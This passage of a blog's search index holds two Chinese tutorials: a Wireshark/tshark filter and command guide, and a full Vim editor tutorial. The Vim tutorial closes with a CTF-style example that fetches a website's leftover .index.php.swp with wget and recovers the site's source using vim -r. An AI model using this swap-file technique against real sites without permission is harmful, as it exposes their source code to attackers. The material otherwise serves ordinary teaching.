\u0026ldquo;GET\u0026rdquo;} 函数 函数 描述 upper 将字符串字段转换为大写 lower 将字符串字段转换为小写 len 返回字符串字段或字节字段的字节长度 count 返回帧中字段的出现次数 string 将非字符串字段转换为字符串 vals 将字段值转换为其值字符串（如果有） dec 将无符号整数字段转换为十进制字符串 hex 将无符号整数字段转换为十六进制字符串 max 返回参数的最大值 min 返回参数的最小值 abs 返回参数的绝对值 upper()、lower() 可以使用这两个函数，将字符串转化为大小写，再进行正则匹配，做到不区分大小写的功能\nlower(http.server) ~ \u0026#34;apache\u0026#34; //过滤HTTP响应头的server字段为apache的 upper(http.request.method) ~ \u0026#34;post|get\u0026#34; //过滤http请求方法为POST或GET len() len()函数将返回字段的字节大小，因此可以和比较操作符配合使用，过滤某个报文字段符合大小要求的报文\nlen(http.request.uri) \u0026gt;= 10 //过滤http头部的URI字段，大于等于10字节的报文 len(http.host) \u0026gt;= 20 //过滤HTTP主机名大于等于20字节的报文 string() 当字段为非字符串类型，而又想转换为字符串字段再进行正则匹配时，很方便\nstring(ip.addr) ~ \u0026#34;^10|^11\u0026#34; //过滤IP为10网段开头或者23网段开头的IP string(ip.dst) matches r\u0026#34;^172\\.(1[6-9]|2[0-9]|3[0-1])\\.[0-9]{1,3}\\.255\u0026#34; //匹配目的IP中以255结尾的IP地址(172.16到172.31) max()、min() max()和min()接受相同类型的任意数量的参数，并分别返回集合中最大/最小的参数\nmax(tcp.srcport,tcp.dstport) \u0026lt;= 1024 //过滤tcp源端口、目的端口，最大不能超过1024的报文 min(tcp.srcport+tcp.dstport) \u0026gt;= 1024 //过滤tcp源端口+目的端口大于等于1024的报文 过滤IP 1）源地址为192.168.0.1的包\nip.src == 192.168.0.1 2）目的地址为192.168.0.1的包\nip.dst == 192.168.0.1 3）源地址或目的地址是192.168.0.1的包\nip.addr == 192.168.0.1 要原地址和目标地址一样就用===\n4）排除上述包\n!(表达式) 过滤协议 1）仅捕获某种协议的包\n直接写协议名即可，如http（区分大小写）\n2）捕获多种协议的包\n使用逻辑或\nhttp or telent 3）排除某种协议的包\n使用逻辑非\nnot http ! http 过滤端口（需要指明协议） 1）捕获某一端口的包\ntcp.port == 80 2）捕获多端口的包\n可以用and来表示多端口并列\ntcp.port == 80 and 8080 也可以用比较运算符\nudp.port \u0026gt;= 2048 过滤长度、内容 1）长度（数据段的长度）\nudp.length \u0026gt;= 30 //udp的payload长度 http.content_length \u0026lt;= 20 //http消息体长度 2）数据包内容\n使用matches/contains\n过滤时间 frame.time \u0026gt;= \u0026#34;Apr 16, 2021 06:00:00.0\u0026#34; \u0026amp;\u0026amp; frame.time \u0026lt;= \u0026#34;Apr 16, 2021 06:59:00.0\u0026#34; frame.time \u0026gt; \u0026#34;2024-04-11 11:00:00\u0026#34; and frame.time \u0026lt; \u0026#34;2024-04-11 11:01:00\u0026#34; 注意：时间是字符串，要用双引号括起来\ntshark基本命令 -r \u0026ndash; 从一个已有的捕获文件读取数据包进行分析 **-r 111.pcap：**从名为 111.pcap 的文件中读取数据包并简略打印出来\neg:\n1.837951 192.168.1.12 -\u0026gt;192.168.1.5 TCP 72 8080 -\u0026gt; 45940 [FIN, ACK] Seq=1 ... ​ 时间戳 原IP 目标IP 协议 数据包长度 源端口 目标端口 报文标头信息\n-n/-N \u0026ndash; 禁止反向解析 -n \u0026ndash; 禁用域名解析，不对 IP 地址和端口号进行名称解析 默认情况下，tshark 会尝试将捕获到的 IP 地址解析为主机名（192.168.1.1-\u0026gt;exaple.com），同时也会将端口号转换为服务名称（如 80 变成 http，443 变成 https 等）\n通过使用 -n 参数，可以避免这些解析，直接显示原始的 IP 地址和端口号\neg:\ntshark -r file.pcap //直接输出 192.168.1.1 -\u0026gt; example.com 80 tshark -n -r file.pcap //-n输出 192.168.1.1 -\u0026gt; 93.184.216.34 80 -N \u0026ndash; 精准控制解析哪些层级 格式：-N \u0026lt;反向解析flag1\u0026gt; -N \u0026lt;反向解析flag2\u0026gt;\u0026hellip;\nflag取值 含义 d 对于DNS包启用解析 m 启用MAC地址解析 n 启用网络地址解析 N 使用外部解析器（例如DNS）进行网络地址解析，n需要被同时启用才有效果 t 启用传输层端口解析 v 启用VLAN ID的名称解析 eg：\ntshark -r file.pcap //直接输出 1.837951 192.168.1.12 -\u0026gt; 192.168.1.5 TCP 72 45940 -\u0026gt; 80 [FIN, ACK] Seq=1 Ack=2 ... tshark -N t -r file.pcap //-N t(解析传输层端口)输出 1.837951 192.168.1.12 -\u0026gt; 192.168.1.5 TCP 72 45940 -\u0026gt;(http)80 [FIN, ACK] Seq=1 Ack=2 ... ↑ -T \u0026ndash; 指定输出格式 **-T fields：**仅输出指定的字段（需配合 -e 使用）\n**-T text：**以普通文本格式输出（默认）\n**-T json：**以 JSON 格式输出\n**-T jsonraw：**以 JSON（包含原始数据）格式输出\n**-T ek：**以 ElasticSearch 格式输出\n-e \u0026ndash; 指定显示数据包中的特定字段 格式：-e \u0026ldquo;字段1\u0026rdquo; -e \u0026ldquo;字段2\u0026rdquo;\u0026hellip;\n**ip.src：**显示源 IP 地址\n**ip.dst：**显示目标 IP 地址\n**http.host：**显示 HTTP 请求中的主机名\n**http.request.uri：**显示 HTTP 请求中的 URI（即请求的 URL 路径）\n**usbhid.data：**只提取USB HID 设备数据\n**frame.number：**显示数据包的报文帧数\n**frame.time：**显示数据包捕获的时间戳\n**frame.len：**显示数据包的长度\neg:\ntshark -n -r file.pcap -e \u0026#34;frame.number\u0026#34; -e \u0026#34;ip.addr\u0026#34; -e \u0026#34;tcp.port\u0026#34; -e tcp -T fields //输出报文帧数、ip地址、端口、tcp协议的字段 1 192.168.1.12,192.168.1.8 37546,80 Transmission Control Protocol,SrcPort: ... 报文帧数 ip地址 端口 tcp协议的字段 -Y \u0026ndash; 筛选过滤报文 格式：-Y \u0026ldquo;过滤条件\u0026rdquo;\n用来过滤分析符合过滤表达式的报文，相当于wireshark最上面的过滤筛选栏功能\neg:\ntshark -n -r \u0026lt;filename\u0026gt; -Y \u0026#34;http.host == \u0026#34;web-server1\u0026#34;\u0026#34; //通过http.host过滤 tshark -n -r http-keep-alive.pcap -Y \u0026#34;tcp.flags.syn==1\u0026amp;\u0026amp;tcp.flags.ack==0\u0026#34; //过滤第一次握手的请求 -E \u0026ndash; 设置输出的控制字段 通过-T参数来输出特定格式时，可以配合-E参数来设置一些选项\n参数选项 默认 含义 bom=y|n n 在输出前加上UTF-8字节顺序标记（十六进制ef、bb、bf） header=y|n n 打印一个使用-e作为输出第一行的字段名称头部 separator=/t|/s|\u0026lt;character\u0026gt; /t 设置字段分隔符，默认为/t，可以指定/s，即单个空格，或者自定义的其它字符 occurrence=f|l|a a 打印每个字段的第一次(f)/最后一次(l)/或所有出现的内容(a) aggregator=,|/s|\u0026lt;character\u0026gt; , 设置用于每个字段内的分割字符 quote=d|s|n n 设置用于环绕字段的引号字符 n是null，无设置\neg:\ntshark -n -r file.pcap -E header=y -E occurrence=l -Y \u0026#39;icmp.seq==21\u0026#39; -e \u0026#39;icmp.seq\u0026#39; ... -T fields |column -t // -E occurrence=l：包通过IPIP封装，occurrence=l指定输出外层IP // -Y \u0026#39;icmp.seq==21\u0026#39;：指定icmp.seq等于21的ICMP包 // | column -t：将输出通过管道传输给 column 命令，使结果以表格的形式对齐 icmp.seq ip.src ip.dst ip 21 114.132.116.32 113.145.123.23 Internet Protocol Version 4，Src:，Dst: -2 \u0026ndash; 二次依赖分析 没有2以外的参数\ntshark会根据上下文报文的依赖关系（tshark称之为two-pass，即进行两次分析），来显示相关报文关联信息，如：response in frame #、reply in frame、TCP Port numbers reused\n-i \u0026ndash; 指定要捕获数据的网络接口 **-i eth0：**表示从 eth0 网络接口捕获数据包\n**-i wlan0：**表示从无线网卡 wlan0 捕获数据包\n**-i any：**表示捕获所有接口的流量\n**-：**表示从标准输入（stdin）捕获数据流\n-f \u0026ndash; 应用捕获过滤器，只捕获特定的流量 **-f \u0026quot;tcp\u0026quot;：**只捕获 TCP 流量\n**-f \u0026quot;port 80\u0026quot;：**只捕获端口为 80（HTTP）的流量\n**-f \u0026quot;src host 192.168.1.1\u0026quot;：**只捕获源地址为 192.168.1.1 的流量\n-w \u0026ndash; 将捕获的数据包写入到文件中 **-w output.pcap：**将捕获的数据包保存到 output.pcap 文件\n**-：**将捕获的内容输出到标准输出（stdout）\noptions \u0026ndash; 其他可选参数 **-V：**显示详细的包信息\n**-c \u0026lt;count\u0026gt;：**捕获指定数量的包后停止\n**-n：**禁止域名解析，使用 IP 地址而不是主机名显示\n\u0026lt;filter\u0026gt; 指定显示过滤器 如果要用过滤器，一定要放到最后\n**ip.addr == 192.168.1.1：**仅显示源或目标地址为 192.168.1.1 的包。\n**tcp.port == 443：**仅显示端口为 443 的 TCP 数据包（通常用于 HTTPS 流量）。\n**http：**仅显示 HTTP 协议的数据包\n","date":"2025-05-14T01:15:30+08:00","image":"http://picture.928330.xyz/typora/wireshark-for-cybersecurity.jpg","permalink":"https://blog.928330.xyz/p/wiresharktshark%E7%AE%80%E6%98%93%E6%8C%87%E5%8C%97/","title":"wireshark\u0026tshark简易指北"},{"content":"VIM使用方式 vim键盘图 vim操作文件基本方式 打开文件 单个文件\nvim file1 多个文件\nvim file1 file2 ... filen 该方式打开文件，显示屏默认显示第一个文件也就是 file1\n文件之间的切换 :ls \u0026ndash; 列出 VIM 打开的所有文件 :bn \u0026ndash; 显示屏上显示第n个文件 显示多个文件 左右分屏\nvim -On file1 file2 ... filen 这里的 n 是代表有几个文件需要分屏，从左至右依次显示 n 个文件\n上下分屏\nvim -on file1 file2 ... filen 跟上一个命令不同的是 -on 中的 o 是小写，这样将会上下依次显示 n 个文件\n分屏操作（ctrl+w系列） 左右分屏 Ctrl+w+s \u0026ndash; 上下分割当前打开的文件 :sp file \u0026ndash; 上下分割当前文件和新打开的 file 上下分屏 Ctrl+w+v \u0026ndash; 左右分割当前打开的文件 :vsp file \u0026ndash; 左右分割当前文件和新打开的 file 移动分屏 大写字母\nCtrl+w+H \u0026ndash; 将当前的分屏移动到左边 Ctrl+w+L \u0026ndash; 将当前的分屏移动到右边 Ctrl+w+J \u0026ndash; 将当前的分屏移动到上边 Ctrl+w+K \u0026ndash; 将当前的分屏移动到下边 在文件间切换光标 小写字母\nCtrl+w+h \u0026ndash; 将当前光标定位到左边的屏幕 Ctrl+w+l \u0026ndash; 将当前光标定位到左边的屏幕 Ctrl+w+j \u0026ndash; 将当前光标定位到左边的屏幕 Ctrl+w+k \u0026ndash; 将当前光标定位到左边的屏幕 关闭分屏 Ctrl+w+c \u0026ndash; 关闭当前的分屏(多个分屏就只关闭光标所在的分屏) Ctrl+w+q \u0026ndash; 关闭当前的分屏，如果是最后一个分屏将会退出 VIM vim五大模式 普通模式 用户刚刚启动 vi/vim，便进入了普通模式\n此状态下敲击键盘动作会被 Vim 识别为命令，而非输入字符\n普通模式移动光标 快速移动光标\n输入[数字n＋方向]，代表向某个方向移动n\nh / ← / [backspace]：向左移动光标 j / ↓：向下移动光标 k / ↑：向上移动光标 l / → / [space]：向右移动光标 在当前行上移动光标\n0 或功能键[Home] \u0026ndash; 移动到行头 ^ \u0026ndash; 移动到本行的第一个不是 blank 字符 $ 或功能键[End] \u0026ndash; 移动到行尾 g_ \u0026ndash; 移动到本行最后一个不是 blank 字符的位置 w \u0026ndash; 光标移动到下一个单词的开头 e \u0026ndash; 光标移动到下一个单词的结尾 fa \u0026ndash; 移动到本行下一个为 a 的字符处 nfa \u0026ndash; 移动到本行光标处开始的第 n 个 字符为 a 的地方 Fa \u0026ndash; 同fa一样，光标移动方向同fa相反 nFa \u0026ndash; 同 nfa 类似，光标移动方向同 nfa相反 ta \u0026ndash; 移动光标至 a 字符的前一个字符 nta \u0026ndash; 移动到第n个 a 字符的前一个字符处 Ta \u0026ndash; 同ta移动光标方向相反 nTa \u0026ndash; 同 nta 移动光标方向相反 ; \u0026amp; , \u0026ndash; 当使用 f, F, t ,T, 关键字指定字符跳转的时候，使用**；可以快速跳转到下一个指定的字符，,** 是跳到前一个指定的字符 跨行移动光标\nnG \u0026ndash; 光标定位到第 n 行的行首 gg \u0026ndash; 光标定位到第一行的行首 G \u0026ndash; 光标定位到最后一行的行首 H \u0026ndash; 光标定位到当前屏幕的第一行行首 M \u0026ndash; 光标移动到当前屏幕的中间 L \u0026ndash; 光标移动到当前屏幕的尾部 zt \u0026ndash; 把当前行移动到当前屏幕的最上方，也就是第一行 zz \u0026ndash; 把当前行移动到当前屏幕的中间 zb \u0026ndash; 把当前行移动到当前屏幕的尾部 % \u0026ndash; 匹配括号移动，包括 ( , { , [ 需要把光标先移动到括号上 * \u0026amp; # \u0026ndash; 匹配光标当前所在的单词， ***** 是下一个，# 是上一个 翻页操作\nctrl+u \u0026ndash; 向上滚动半页 ctrl+b \u0026ndash; 向上滚动一页 ctrl+d \u0026ndash; 向下滚动半页 ctrl+f \u0026ndash; 向下滚动一页 普通模式操作文本 删除\nd 是删除的意思，通常搭配一个字符 ( 删除范围 ) 实现删除功能，常用的如下：\ndw \u0026ndash; 删除一个单词 dnw \u0026ndash; 删除 n 个单词， dfa \u0026ndash; 删除光标处到下一个 a 的字符处（ fa 定位光标到 a 处 ） dnfa \u0026ndash; 删除光标处到第 n 个 a 的字符处 dd \u0026ndash; 删除一整行 ndd \u0026ndash; 删除光标处开始的 n 行 d$ \u0026ndash; 删除光标到本行的结尾 d0 \u0026ndash; 删除游标所在处到该行的最前面一个字符 dH \u0026ndash; 删除屏幕显示的第一行文本到光标所在的行 d1G \u0026ndash; 删除光标所在到第一行的所有数据 dG \u0026ndash; 删除光标所在到最后一行的所有数据 x \u0026ndash; 删除光标当前所在的字符**(delete)** X \u0026ndash; 删除光标前面的一个字符**(backspace)** nx \u0026ndash; 向后连续删除n个字符 复制\ny 是复制的意思，通常搭配一个字符（复制范围）实现复制的功能，常用的如下：\nyw \u0026ndash; 复制一个单词，还有ynw yfa \u0026ndash; 复制光标到下一个 a 的字符处,还有ynfa yy \u0026ndash; 复制一行，还有nyy y$ \u0026ndash; 复制光标到本号的结尾 yH \u0026ndash; 复制屏幕显示的第一行文本到光标所在的行 y1G \u0026ndash; 复制光标所在行到第一行的所有数据 yG \u0026ndash; 复制光标所在行到最后一行的所有数据 粘贴\np是黏贴的意思，当执行完复制或者黏贴的命令以后，VIM 会把文本寄存起来\np(小写) \u0026ndash; 在光标后开始黏贴\nP(大写) \u0026ndash; 在光标前开始粘贴\n撤销操作和恢复\nu \u0026ndash; 撤销刚才的操作 ctrl+r \u0026ndash; 恢复撤销操作 大小写转换\n~ \u0026ndash; 将光标下的字母改变大小写 3~ \u0026ndash; 将光标位置开始的3个字母改变其大小写 g~~ \u0026ndash; 改变当前行字母的大小写 gUU \u0026ndash; 将当前行的字母改成大写 guu \u0026ndash; 将当前行的字母全改成小写 3gUU \u0026ndash; 将从光标开始到下面3行字母改成大写 gUw \u0026ndash; 将光标下的单词改成大写 guw \u0026ndash; 将光标下的单词改成小写 重复操作\n. \u0026ndash; 重复上一个操作的命令 n\u0026lt;command\u0026gt; \u0026ndash; 重复某个命令 n 次，如 10p复制 10 次，10dd 删除十次 其他\nJ \u0026ndash; 将光标所在行与下一行的数据结合成同一行 c \u0026ndash; 重复删除多个数据，例如向下删除 10 行，10cj 插入模式 进入插入模式 命令 说明 i, I i \u0026ndash; 从目前光标所在处输入\nI \u0026ndash; 在目前所在行的第一个非空格符处开始输入 a, A a \u0026ndash; 从目前光标所在的下一个字符处开始输入\nA \u0026ndash; 从光标所在行的最后一个字符处开始输入 o, O o \u0026ndash; 在目前光标所在的下一行处输入新的一行\nO \u0026ndash; 在目前光标所在的上一行处输入新的一行 s，S s \u0026ndash; 删除光标所在处的字符然后插入需要录入的文本\nS \u0026ndash; 删除光标所在行，在当前行的行首开始插入需要录入的文本 cw 删除从光标处开始到该单词结束的所有字符，然后插入需要录入的文本 插入模式的命令 必须知道的：#是vim中的注释符号\n在输入模式中，可以使用以下按键：\n字符按键以及Shift组合，输入字符 ENTER，回车键，换行 BACK SPACE，退格键，删除光标前一个字符 DEL，删除键，删除光标后一个字符 方向键，在文本中移动光标 HOME/END，移动光标到行首/行尾 Page Up/Page Down，上/下翻页 Insert，切换光标为输入/替换模式，光标将变成竖线/下划线 ESC，退出输入模式，切换到命令模式 替换模式 进入替换模式 R \u0026ndash; 进入替换模式，此时新输入的文本将直接替代/覆盖已经存在的内容，点击ESC键返回常规模式\nr \u0026ndash; 进入单字符替换模式，此时新输入的字符将替代光标之下的当前字符，然后自动返回到常规模式\ngR \u0026ndash; 进入虚拟替换模式，其与替换模式最主要的区别在于，对\u0026lt;Tab\u0026gt;键和换行符的不同处理方式\ngr \u0026ndash; 进入单字符虚拟替换模式，在替换光标下的当前字符之后，将自动返回到常规模式\n虚拟替换模式 \u0026lt;Tab\u0026gt;键\n替换模式（REPLACE）下，在原有\u0026lt;Tab\u0026gt;键处输入字母\u0026rsquo;a\u0026rsquo;，将直接替代\u0026lt;Tab\u0026gt;键所占用的所有空格的位置\n虚拟替换模式（VREPLACE）下，在原有\u0026lt;Tab\u0026gt;键处输入字母\u0026rsquo;a\u0026rsquo;，将仅仅替代单个空格\n\u0026lt;NL\u0026gt;换行\n替换模式（REPLACE）下，输入\u0026lt;Enter\u0026gt;回车键将增加新行：\n虚拟替换模式（VREPLACE）下，输入\u0026lt;Enter\u0026gt;回车键将用新行替代当前行内容（即清空当前行）：\n命令模式 在命令模式下按下 :（英文冒号）就进入了底线命令模式\n有的命令要输入 / 执行\n命令模式常用命令 :w \u0026ndash; 保存文件 :q \u0026ndash; 退出 Vim 编辑器 :wq \u0026ndash; 保存文件并退出 Vim 编辑器 :q! \u0026ndash; 强制退出Vim编辑器，不保存修改 :set nu \u0026ndash; 显示行号 :set nonu \u0026ndash; 取消行号 :n \u0026ndash; 定位到第n行 :n1,n2d \u0026ndash; 删除行号n1至n2之间的内容（n1和n2都代表数字） 按 ESC 键可随时退出底线命令模式\n命令模式处理文件 :w [filename] \u0026ndash; 将编辑的数据储存成另一个文件（类似另存新档） :r [filename] \u0026ndash; 在编辑的数据中，读入另一个档案的数据，即将filenam的内容加到光标所在行后面 :n1,n2 w [filename] \u0026ndash; 将 n1 到 n2 的内容储存成 filename 命令模式搜索文本 ?{目标字符串} \u0026ndash; 向光标之上寻找一个目标字符串 /{目标字符串} \u0026ndash; 向光标之下寻找一个目标字符串 n \u0026ndash; 重复前一个搜寻的动作 N \u0026ndash; 反向进行前一个搜寻动作 :set ic \u0026ndash; 编辑器将不会区分大小写 :set noic \u0026ndash; 编辑器将区分大小写 命令模式替换文本 格式：:(作用范围)s/{目标}/{替换}(/替换的标志)\n替换的作用范围\n标志 作用 s 当前行替换 %s 全文替换 n1,n2s 指定行替换，替换n1到n2间所有行的目标，n2可以是$，代指最后一行 \u0026rsquo;\u0026lt;,\u0026rsquo;\u0026gt;s 指定区域替换 替换的标志\n标志 作用 [无] 只替换作用范围内，每行第一次出现的目标 g 一次性替换所有作用范围内所有的目标 i 大小写不敏感查找 I 大小写敏感查找 c 对作用范围内的目标逐个替换，替换前需进行确认 替换标志可以使用多个，比如/gic\n命令模式执行linux命令 :![command]\n打开终端窗口并打印执行命令的结果，不会改变当前编辑的文件的内容\n可以使用:!bash打开bash shell并执行命令\n:!date\t//执行 date 命令显示时间，执行完命令以后按下键盘上的 Enter 就会返回到文件 :r ![command]\n将shell命令command的结果插入到当前行的下一行\n:r !date\t//读取系统时间并插入到当前行的下一行 n1,n2 ![command]\n将n1至n2行范围内的内容交给命令command处理，并将处理结果替换起始行号和结束行号指定范围中的内容\n:1,4 !sort\t//将第1行到第4行的内容进行排序 可以只指定起始行\n:1 !tr [a-z] [A-Z]\t//将第1行的小写字母转为大写字母 可以用.表示当前光标所在行 (输入!!会变成:.!)\n:. !tr [a-z] [A-Z]\t//将当前行的小写转为大写 n1,n2 w ![command]\n将起始行号和结束行号所指定范围的内容作为命令command的输入，不会改变当前编辑的文件的内容\n可以使用:1 w !bash，将会把第1行的内容作为bash命令来执行并显示结果，而且不会改变当前编辑的文件的内容\n同样的 : . w !bash将当前行的内容作为bash命令来执行\n!!\n重新执行最近一次运行过的命令\n:shell / :terminal\n打开命令终端（输入exit结束并返回vim）\n使用:version命令（按q退出），查看是否包含+terminal关键字，以确认是否能使用 :terminal\n命令模式定义快捷键 基本格式\n模式 基本格式 描述 普通模式 :nmap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 仅在普通模式下有效，定义普通模式下的快捷键 插入模式 :imap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 用于定义插入模式下的快捷键 可视模式 :vmap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 用于定义可视模式下的快捷键 命令行模式 :cmap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 用于定义命令行模式下的快捷键 总体映射 :map \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 定义快捷键，适用于普通、可视、操作和选择模式，但不建议用于有冲突的情况。 总体不可递归映射 :noremap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 类似:map，但是不会递归地扩展已经存在的映射，避免意外行为。 普通模式不可递归 :nnoremap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 在普通模式下使用，避免递归映射 插入模式不可递归 :inoremap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 在插入模式下使用，避免递归映射 可视模式不可递归 :vnoremap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 在可视模式下使用，避免递归映射 缩写 :ab [缩写] [完整文本] 输入缩写后空格，自动扩展为完整文本。例如：:ab email xxxx@gmail.com 什么是\u0026lt;key\u0026gt;？\n\u0026lt;key\u0026gt; 对应的是 ^[A-Z] ， 定义快捷键时使用ctrl+v+[a-z]，使用快捷键时用对应的ctrl+[a-z]\n什么是递归映射？\n:nmap j gg :nmap Q j 如果已经做了以上映射，那么按下Q，执行的将是gg而不是j\n为了避免以上问题，应该这样定义：\n:nnoremap j gg :nnoremap Q j 几个例子\n:map ^D Ahelloworld\u0026lt;ESC\u0026gt; 在文件的光标所在行的行尾，添加 helloworld 字符串，按住组合键 ctrl + d 就会执行操作\n:map ^M I#\u0026lt;ESC\u0026gt; 在文件光标处所在行的行首插入#，按住组合键 ctrl + m 就会执行操作\n:ab email xxxx@gmail.com 输入 email+空格 会把输入的 email 自动替换成 xxxx @gmail.com\n可视化模式 进入可视化模式 可视化模式可以分为以下三种：\nv \u0026ndash; 字符可视化模式，文本选择是以字符为单位的 V \u0026ndash; 行可视化模式，文本选择是以行为单位的 ctrl-V \u0026ndash; 块可视化模式，可以选择一个矩形内的文本 在任意可视化模式下使用以上命令，将会切换到对应模式\n在任意可视化模式下使用I（大写i），将会切换到插入模式\ngv \u0026ndash; 进入上一次的可视化模式，并选中当时选中的文本**（命令模式也能用此命令）** 按 ESC 键可随时退出可视化模式\n可视化模式下移动光标 命令模式下的光标移动方法仍然适用\n进入任意可视化模式，移动光标，会从当前位置开始，以相应方式高亮选中字符\no \u0026ndash; 移动光标到已经选取的文本的结尾处或者开头处（根据现在光标所在位置确定）\n如果是块可视化模式，移动光标到对角处 O \u0026ndash; 在块可视化模式下，移动光标到同一行的结尾处或者开头处\n可视化模式下编辑 大部分命令模式对内容操作的命令都能在可视化模式下使用，比如：\nd \u0026ndash; 删除高亮文本\nD \u0026ndash; 删除一整行文本，即使只有一部分被选中了\nc \u0026ndash; 删除高亮文本并进入插入模式\ny \u0026ndash; 复制高亮文本\nY \u0026ndash; 复制一整行文本\np \u0026ndash; 黏贴复制的文本\n~ \u0026ndash; 对高亮文本进行大小写转换\n\u0026gt; / \u0026lt; \u0026ndash; 对高亮文本增加/减少缩进，幅度为一个Tab键\nr \u0026ndash; 输入单个字符，把高亮文本所有字符逐个替换为该字符\nvim宏录制 宏录制的录制操作 假设需要将文本的每一行的行首插入入一个 tab 键\n先将光标移动到第一行，在普通模式下按下 q 键（宏录制是 q 键启动的) 按一个 a （字母随意）,表示该宏注册为 a 按下 I 在行首插入一个 tab 键 按下ESC退出编辑模式 按下 j 将光标移动到下一行行首 按下 q 键完成录制操作（宏录制是 q 键结束的） 主要步骤：q(开始）-\u0026gt; a(命名) -\u0026gt; 操作 -\u0026gt; q(结束)\n宏录制的使用 @a \u0026ndash; 执行a宏录制的一系列动作，注意a是录制的操作名称 n@a \u0026ndash; 执行n次a宏 @@ \u0026ndash; 重复上一次使用的宏操作 VIM相关案例 vim缓存泄露 vim交换文件 在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容\n现在用vim打开文件1.txt，直接关闭终端，再次试图用vim打开1.txt时会出现如下提示：\n选择恢复（R），弹出如下提示：\nVim 中，当处理同一个文件发生多次异常退出时，它会依次使用不同的后缀来命名交换文件。按照你给出的模式，首次产生的交换文件名为 .index.php.swp，再次意外退出后产生 .index.php.swo，第三次产生的交换文件为 .index.php.swn。\n从第四次开始及之后的交换文件，Vim 会循环使用这三个后缀（.swp, .swo, .swn）\n例题 使用以下命令获取网站中的vim文件缓存：\nwget http://xxx/.index.php.swp -P /home //-P指定下载位置 使用vim -r恢复文件并打开:\nvim -r .index.php.swp 获取到网站源码后，进行代码审计即可\n","date":"2025-05-08T15:28:02+08:00","image":"http://picture.928330.xyz/typora/DeWatermark.ai_1756040226707.jpeg","permalink":"https://blog.928330.xyz/p/vim%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%8C%E5%85%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","title":"Vim编辑器完全使用教程"}]